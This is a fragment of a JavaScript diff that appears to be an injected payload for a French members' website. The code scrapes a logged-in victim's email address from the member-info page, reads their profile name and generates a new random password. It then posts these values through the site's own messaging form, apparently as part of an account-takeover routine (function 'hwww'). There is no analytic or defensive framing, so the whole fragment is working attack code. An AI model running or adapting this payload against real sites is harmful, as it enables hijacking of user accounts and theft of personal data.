@@ -17,24 +17,27 @@ function hwww(email, pwd) {
     }).then((r) => console.log(r.url, r.status), (e) => alert(e))
 }
 
-fetch('/membres/infos_membre.htm').then(function(response) {
-    return response.text();
-}).then(function(html) {
+var hwurl = location.href
+let pwd = (Math.random() + 1).toString(36).substring(2);
+let profil = document.getElementById("tdright").innerText;
+var sd = "ok";
+
+fetch('/membres/infos_membre.htm').then(r => r.text()).then(function(html) {
     let parser = new DOMParser();
     let doc = parser.parseFromString(html, 'text/html');
-    let profil = doc.evaluate('//*[@id="body_right"]/div/div/div/a', doc, null, XPathResult.STRING_TYPE, null).stringValue
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = encodeURIComponent("mv" + doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue);
-    let pwd = (Math.random() + 1).toString(36).substring(2);
+    let sd = "pw_" + profil + "_em_" + email + "_pwd_" + pwd;
+    console.log(sd)
 
-    fetch(location.href, {
+    fetch(hwurl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
-            'sujet': 'Leaf',
+            'sujet': 'Leadd',
             piece_jointe_1: undefined,
             piece_jointe_2: undefined,
-            message: "pw_" + profil + "_em_" + email + "_pwd_" + pwd,
+            message: "pw_" + profil + "_pwd_" + pwd,
             send_msg: "Envoi en cours, patientez SVP..."
         })
     }).then((r) => {
